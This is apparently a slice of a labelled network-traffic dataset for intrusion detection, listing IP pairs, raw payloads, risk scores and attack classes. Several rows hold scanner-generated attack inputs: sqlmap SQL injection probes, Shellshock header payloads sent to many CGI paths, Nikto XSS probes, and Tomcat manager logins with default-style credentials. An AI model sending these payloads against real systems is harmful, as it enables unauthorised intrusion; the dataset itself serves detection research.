idx,s_ip,s_port,d_ip,d_port,protocol,payload,risk,class
419,75.106.71.172,50826,163.86.165.30,80,TCP,"GET /?id=user%22%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20WTSH HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.3.4#stable (http://sqlmap.org)
Host: 192.168.136.132
Referer: http://192.168.136.132:80
Cache-Control: no-cache

",1,2_exploit
420,44.244.42.218,28241,11.56.11.10,8080,TCP( 6 ),"GET /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=2DB51B70DF17EEE27863DBC19BBBA14A HTTP/1.1\r\nHost: 172.16.1.80:8080\r\nCache-Control: max-age=0\r\nAuthorization: Basic dG9tY2F0OmJhcm5lcw==\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: JSESSIONID=F0D2FDE2E733CA90854182CA10BDC92C; JSESSIONID=6FB022130137336ED0BA1F4197B17BC0\r\nConnection: close\r\n\r\n",1,3_post
421,12.105.13.124,80,209.35.54.175,49632,TCP,"HTTP/1.1 403 Forbidden
Date: Thu, 28 Jul 2022 08:20:02 GMT
Server: Apache/2.4.6 (CentOS)
Last-Modified: Thu, 16 Oct 2014 13:20:58 GMT
ETag: ""1321-5058a1e728280""
Accept-Ranges: bytes
Content-Length: 4897
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd""><html><head>
<meta http-equiv=""content-type"" content=""text/html; charset=UTF-8"">
..<title>Apache HTTP Server Test Page powered by CentOS</title>
..<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"">

    <!-- Bootstrap -->
    <link href=""/noindex/css/bootstrap.min.css"" rel=""stylesheet"">
    <link rel=""stylesheet"" href=""noindex/css/open-sans.css"" type=""text/css"" />

<style type=""text/css""><!--.. 

body {
  font-family: ""Open Sans"", Helvetica, sans-serif;
  font-weight: 100;
  color: #ccc;
  background: rgba(10, 24, 55, 1);
  font-size: 16px;
}

h2, h3, h4 {
  font-weight: 200;
}

h2 {
  font-size: 28px;
}

.jumbotron {
  margin-bottom: 0;
  color: #333;
  background: rgb(212,212,221); /* Old browsers */
  background: radial-gradient(ellipse at center top, rgba(255,255,255,1) 0%,rgba(174,174,183,1) 100%); /* W3C */
}

.jumbotron h1 {
  font-size: 128px;
  font-weight: 700;
  color: white;
  text-shadow: 0px 2px 0px #abc,
               0px 4px 10px rgba(0,0,0,0.15),
               0px 5px 2px rgba(0,0,0,0.1),
               0px 6px 30px rgba(0,0,0,0.1);
}

.jumbotron p {
  font-size: 28px;
  font-weight: 100;
}

.main {
   background: white;
   color: #234;
   border-top: 1px solid rgba(0,0,0,0.12);
   padding-top: 30px;
   padding-bottom: 40px;
}

.footer {
   border-top: 1px solid rgba(255,255,255,0.2);
   padding-top: 30px;
}

    --></style>
</head>
<body>
  <div class=""jumbotron text-center"">
    <div class=""container"">
   .  <h1>Testing 123..</h1>
  ..<p class=""lead"">This page is used to test the proper operation of the <a href=""http://apache.org"">Apache HTTP server</a> after it has been installed. If you can read this page it means that this site is working properly. This server is powered by <a href=""http://centos.org"">CentOS</a>.</p>
..</div>
  </div>
  <div class=""main"">
    <div class=""container"">
       <div class=""row"">
  ...<div class=""col-sm-6"">
    ...<h2>Just visiting?</h2>
...  ..<p class=""lead"">The website you just visited is either experiencing problems or is undergoing routine maintenance.</p>
  .....<p>If you would like to let the administrators of this website know that you've seen this page instead of the page you expected, you should send them e-mail. In general, mail sent to the name ""webmaster"" and directed to the website's domain should reach the appropriate person.</p>
  .....<p>For example, if you experienced problems while visiting www.example.com, you should send e-mail to ""webmaster@example.com"".</p>
.  ...</div>
  ....<div class=""col-sm-6"">
.  ....<h2>Are you the Administrator?</h2>
..  ...<p>You should add your website content to the directory <tt>/var/www/html/</tt>.</p>
..  ...<p>To prevent this page from ever being used, follow the instructions in the file <tt>/etc/httpd/conf.d/welcome.conf</tt>.</p>

.  ....<h2>Promoting Apache and CentOS</h2>
...  ..<p>You are free to use the images below on Apache and CentOS Linux powered HTTP servers.  Thanks for using Apache and CentOS!</p>
....  .<p><a href=""http://httpd.apache.org/""><img src=""images/apache_pb.gif"" alt=""[ Powered by Apache ]""></a> <a href=""http://www.centos.org/""><img src=""images/poweredby.png"" alt=""[ Powered by CentOS Linux ]"" height=""31"" width=""88""></a></p>
  ....</div>
.  ..</div>
.    </div>
..</div>
.</div>
.  <div class=""footer"">
      <div class=""container"">
        <div class=""row"">
          <div class=""col-sm-6"">          
            <h2>Important note:</h2>
            <p class=""lead"">The CentOS Project has nothing to do with this website or its content,
            it just provides the software that makes the website run.</p>
            
            <p>If you have issues with the content of this site, contact the owner of the domain, not",2,2_exploit
422,172.68.32.132,48306,33.73.76.3,80,TCP( 6 ),GET /mpcgi/printenv HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /mpcgi/restore_config.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /mpcgi/ruby.rb HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /mpcgi/search HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /mpcgi/search.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /mpcgi/server.php HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /mpcgi/status HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /mpcgi/sysinfo.pl HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /mpcgi/test HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /mpcgi/test-cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /mpcgi/test.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /mpcgi/test_cgi.php HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /mpcgi/test.cgi.php HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /mpcgi/test_cgi.pl HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /mpcgi/test-cgi.pl HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /mpcgi/test.py HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /mpcgi/test.sh HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /mpcgi/tmUnblock.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /mpcgi/uname.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;ec,1,2_exploit
423,39.118.18.196,47760,152.92.106.103,36378,TCP,......(,2,4_unknown
424,169.38.105.200,3389,216.133.191.108,45150,TCP( 6 ),".........4.............A...M..a..Un.-f.>dlc..W..!.0O..l.T.z.l. .\""......%..........x.,.%..\n..u.../..................0...0..........a....i_.O...Ae..0\r..*.H..\r.....0.1.0...U...\rWIN-webServer0..\r210722081657Z.\r220121081657Z0.1.0...U...\rWIN-webServer0..\""0\r..*.H..\r..........0..\n......E..\r{$.E..T..O.F3}f.5K.....|..<gl..D@W....._.>S...)\"".....O..w..e........\r.5...*..n..V\nNd.!..1..Y...?..8.|.h..*]..:...........i..I.&.nV.%..b(/.Rh-....J|S0@...^.qzY_|..,.UB../-'.&)......,+d...TV..P.x^,...j9M.x.3..E.N.>..@..}...ZBSVp.&..I.....HHP......._j_........$0\""0...U.%..0\n..+.......0...U.......00\r..*.H..\r.........._........8..'Qs.gT...M4......DsH......QlL....au...q.a.U.,H)..~_%8N.v...r..@.7Y.c.f.......<KE..F......g..X.......-u...P.ct...RO.\n..........y.i....\\'f:W........<....?_.P..k[....k..........'!.\"".^.3<.R...........y...L..'vF.!)Sz.#}.....]....88.C.d._..E<../@Fd................0.R..>..>.t......v=.\\.t..X.dU6...Q..1...m|.w..Q1,......'J...... Hw.d..j..99..]M.....H......A...OZ.\""O.l...x..S..Fi.z.._j@\\j..7.....<.v..w.Y...|m.ay.W|...tr.~.9..$...u`0s...:.l......x.@q.4.us....`j..{!.J...C.......rY.Fd.......,m..NO.Q>.C..(.f.C=...|......7....)..&E..$=....0F6....}..d.5x....Q8,..X.!..c.^.A....+.}\rBOQ......O..9h.... .....R........2...d\"".{......N..M",3,3_post
425,138.237.27.38,47760,10.81.28.185,57726,TCP,......(,2,4_unknown
426,222.120.167.63,47760,123.12.231.140,56020,TCP,......(,2,4_unknown
427,144.45.64.41,50006,182.132.111.61,5985,TCP( 6 ),"....C...hU...Z._.... ...rAO...%....Hs.:.....O.<.`....... U.,M..r.u8].u...4..f&;l.(...<tn>.M.}...Y....A......:.....z.C......9'|}.....3.[.....h........)x.>.[H<h+.\""...{.2..:-.&qlz.cS....Mm=.c.....F@(P.......juy...........r...o...Q...*09w4&D1.q.X.t:G7.O.......[..8._........}.8.).....U.d9.3.:.Vb(...lB.......:.l...`w...\r24e......?.}.......x..u.......}..Z................o..Z....>j...%.v.k.Y..^....jr.....1D@I.WW>.2...?K...65..0..E.....X....j..R.fA....k....\""..yU.jw.tB.......N]`.=.4..X.c.....7...,....^rmL...xK8U.S.....pEz...c..-R.u.........K.'..T..lXd....~...gag....7c...`>>.L.OJ\r#.+...w.$.....iH......_....o.$Gn.........`Q.......s--Encrypted Boundary--\r\nPOST /wsman?PSVersion=7.1.3 HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: multipart/encrypted;protocol=\""application/HTTP-SPNEGO-session-encrypted\"";boundary=\""Encrypted Boundary\""\r\nUser-Agent: Microsoft WinRM Client\r\nContent-Length: 1913\r\nHost: 172.16.1.71:5985\r\n\r\n--Encrypted Boundary\r\nContent-Type: application/HTTP-SPNEGO-session-encrypted\r\nOriginalContent: type=application/soap+xml;charset=UTF-8;Length=1658\r\n--Encrypted Boundary\r\nContent-Type: application/octet-stream\r\n.........e_.*.\no..........A*P...{:....4Qo.....,....!\n...:..SN.:Hy.I.|..bT,...c.E.gs.M$...n..A.;\r......w..,..........e......p5'.\rC...P...{.IU.....=.Z.2.......E533)..,j\""/3.n&[.i..w`...*.a.U.6.....B..&8....+k...c..G...5wg8..F...H....(y.6.r.4.B.rs,.:(........@Y.4x..5..L...7.......o...)-7H......4.(B.88~m\\.) ....U.d.,.&R.z%.)...H...O...J.t(JV.;._.e...|.....K..'.J...):@m.._\r..../....'...C....h...-....wt).-..X|.CN....K..y...)...Rh..4`....j.5l.:....H..f....;.J...up_N....y....LhE...d8.\"".../...NX*..g^.l..........;O........\""..:.6.4.P....v..c..T.Rj....V).*3.L.c&]..N...=Z.a....6rl&...X...2 ..a.c%.....SR...@.4-8.X...j..a>c.\\s1[...CO%N.:...W6..i....C...*..W.7k..qZ<....j..y.{+.}..xu...........Rx\r..a.0...j%..T....\"".+.|..>..A\""...e|..u.c...a...C.\"".P;\\..FUp^...i.....t..L.U.q..:P.\n.N.N:`?....?..J'fX*...!b..=.k .%.%Z..7....mo.;3j../\n.s.b..`.oD}..ka.`.Ax(.....i...E...l%YU..._)...$-..@o(..'..4c....o.4...q6q....S..........,....L.....[e...')....Ex..8q...vP..o#....bsNLOF......z.A.H1.XDZ.P........98}.Zc......7_.]......ke.m...F.....U...D...`.....9...0q..q..>....j....2._TQX......f..MkC.....#.}.p.u.y.1p....:..>..Wx.9+.C..i.~/g.&Y/.......(...u.%...0!..hG....n..7..(.4.3....:......r..5.....IP$..Y.....\r...\\hZ..~R...;..(.=...,....6.......<..?g.K......*.e..$...5.......K..a^;~Q>.....l..1..A..sZZ1\""\\o......=.d........\\.%ZC.....7...1....C....C..<.......\\.._.E.]J..c..kp.w..tG...R..S..K1...#.......+......$^......D...n...n7,.[]........}...R.4#.=.........zl&.....(.Q....8......m..s.0,.../(..q/@9...\\Y.&..M@$..*+....#.........=.m.(.V.k....l-*....].^........;.S....-..i.\\rS...]Bs..r.-.n.9j...J.b v.]g.q.Qb..X..=..F...q.Ac.y..b|..l.]S..x..60\\f...%e.v.~../8ay\""Ei...c....j.f...u........d.:Q.....\""..x...*..--Encrypted Boundary--\r\nPOST /wsman?PSVersion=7.1.3 HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: multipart/encrypted;protocol=\""application/HTTP-SPNEGO-session-encrypted\"";boundary=\""Encrypted Boundary\""\r\nUser-Agent: Microsoft WinRM Client\r\nContent-Length: 1913\r\nHost: 172.16.1.71:5985\r\n\r\n--Encrypted Boundary\r\nContent-Type: application/HTTP-SPNEGO-session-encrypted\r\nOriginalContent: type=application/soap+xml;charset=UTF-8;Length=1658\r\n--Encrypted Boundary\r\nContent-Type: application/octet-stream\r\n.........*..@.cV....J.'......l.f.;.#.:.Y&.);.]N....\""../9...U..D.*......+.......4 &.....YS!/...0s.}O.....Z...../.;.U...Q.ZkG.(...4.k..l...:.....Q..8vF.s.:*.f....1.....v...-.....g..1>..\""Z....j*..U..h...^K.i6....P......4.........aO.A5%r.&o..t..z.7....2.;.U.#..ph.0...J...l..\r..x.i.9.U...&.|.#.E:k>`...\r..............m[......w......_}@K_.u.(\r..8<y......c..;..z\n..!E.....^.....s........|........<..?.L..C.]..B...G.O.o..1.......[.....|t.;....\r...+.0..........1K .j...B..aZ ...{..>......Y|D.j.0......f.7/.......]n..2..o..q..gl4|.+..o\r....\n.....zg:M..4.dQ.y..*...-....{7AZL....-.F....c....$EQ../.......i\"".%..z.....c........K.Q] T......D...e.j.i..>M...2h.....r.....R.+.0u^}I6.[.e..K.'..>.[.0...*.....).t......A.8.M.m.{..>.3..7.O.F.B.....k3n7B..&`..k?.....C\n....n.3....0R.\"",^mI.zi..... ...F.?'.LA..._..",2,3_post
428,199.37.61.8,56392,191.199.181.53,80,TCP,"GET /?id=user%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.3.4#stable (http://sqlmap.org)
Host: 192.168.136.132
Referer: http://192.168.136.132:80
Cache-Control: no-cache

",1,2_exploit
429,213.39.67.77,47760,45.2.213.71,34852,TCP,......(,2,4_unknown
430,148.65.123.23,3389,35.90.169.36,56328,TCP( 6 ),.........4.........,3,3_post
431,69.162.47.164,3389,51.174.15.96,52348,TCP( 6 ),.........4.........,3,3_post
432,137.76.115.223,16370,180.246.28.9,8080,TCP( 6 ),"GET /manager/html HTTP/1.1\r\nHost: 172.16.1.80:8080\r\nCache-Control: max-age=0\r\nAuthorization: Basic YWRtaW46d2l6YXJkcw==\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: JSESSIONID=188F8C229EAD4FC819679F4ECD0789CB; JSESSIONID=CC45C29586478AE7E3777E6B7681F619\r\nConnection: close\r\n\r\n",1,3_post
433,91.234.94.86,36866,220.67.56.253,80,TCP( 6 ),GET /cgi-914/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script> HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003278)\r\nHost: 172.16.1.50\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 12\r\n\r\ndump_sql=fooGET /cgi-915/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script> HTTP/1.1\r\nContent-Length: 12\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 172.16.1.50\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003278)\r\nConnection: Keep-Alive\r\n\r\ndump_sql=fooGET /bin/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script> HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003278)\r\nContent-Length: 12\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ndump_sql=fooGET /cgi/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script> HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003278)\r\nContent-Length: 12\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ndump_sql=fooGET /mpcgi/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script> HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 12\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003278)\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\n\r\ndump_sql=fooGET /cgi-bin/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script> HTTP/1.1\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003278)\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 12\r\n\r\ndump_sql=fooGET /ows-bin/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script> HTTP/1.1\r\nContent-Length: 12\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003278)\r\n\r\ndump_sql=fooGET /cgi-sys/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script> HTTP/1.1\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003278)\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 12\r\n\r\ndump_sql=fooGET /cgi-local/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script> HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003278)\r\nHost: 172.16.1.50\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 12\r\n\r\ndump_sql=fooGET /htbin/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script> HTTP/1.1\r\nContent-Length: 12\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 172.16.1.50\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003278)\r\nConnection: Keep-Alive\r\n\r\ndump_sql=fooGET /cgibin/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script> HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 12\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003278)\r\nHost: 172.16.1.50\r\n\r\ndump_sql=fooGET /cgis/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>,1,2_exploit
